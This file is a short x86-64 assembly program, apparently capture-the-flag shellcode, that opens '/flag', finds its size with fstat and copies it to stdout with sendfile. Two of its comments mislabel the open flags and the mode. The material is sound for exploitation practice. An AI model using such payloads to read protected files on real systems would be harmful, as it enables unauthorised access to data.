.intel_syntax noprefix

.global _start
.section .text

_start:
mov rax, 2                  # sys_open
lea rdi, [rip + filepath]   # File
mov rsi, 0                  # Flags (none)
xor rdx, rdx                # Mode (O_RDONLY)
syscall

# Store the file descriptor for future uses. R12 is preserved across syscalls due
# to ABI rules
mov r12, rax

mov rdi, r12                # File descriptor
# Buffer allocation on the stack. The buffer size is the size of "struct stat" required by syscall
sub rsp, 144                
mov rsi, rsp                # Buffer pointer
mov rax, 5                  # sys_fstat
syscall

mov rdi, 1                  # Out file descriptor (stdout)
mov rsi, r12                # In file descriptor
mov rax, 40                 # sys_sendfile
mov rdx, 0                  # Offset
# File Length extracted from the buffer retrieved with the previous syscall
# It can be found at offset 48 in the struct
mov r10, [rsp + 48]         
syscall

mov rax, 60                 # sys_exit
mov rdi, 0
syscall

filepath:
.string "/flag"
